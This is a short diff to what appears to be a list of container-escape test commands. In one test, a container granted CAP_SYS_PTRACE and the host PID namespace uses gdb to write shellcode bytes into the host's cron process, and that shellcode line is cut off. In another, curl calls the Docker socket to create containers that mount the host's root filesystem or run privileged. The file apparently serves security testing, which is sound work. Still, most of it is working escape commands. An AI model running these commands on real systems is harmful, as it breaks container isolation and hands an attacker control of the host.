@@ -13,7 +13,7 @@ sudo systemctl restart rabbitmq-server
 tests:
 (1) CAP_SYS_PTRACE
     sudo docker run -it --cap-add CAP_SYS_PTRACE --pid=host --security-opt=apparmor:unconfined ubuntu:latest
-    apt update && apt install gdb -y
+    apt update && timeout 3000 yes "8" | apt install gdb -y
     gdb -p <pid: ps aux | grep cron>
     set {long}($rip+0) = 0x296afc93f9fc91f9
     set {long}($rip+8) = 
@@ -41,4 +41,3 @@ tests:
     apt update && apt install curl -y
     curl --silent -XPOST --unix-socket /run/docker.sock -d '{"Image":"ubuntu:latest","HostConfig":{"Binds":["/:/host"]}}' -H 'Content-Type: application/json' http://localhost/containers/create?name=evil
     curl --silent -XPOST --unix-socket /run/docker.sock -d '{"Image":"ubuntu:latest","Privileged":true}' -H 'Content-Type: application/json' http://localhost/containers/create?name=evil
-    docker run -it --privileged ubuntu
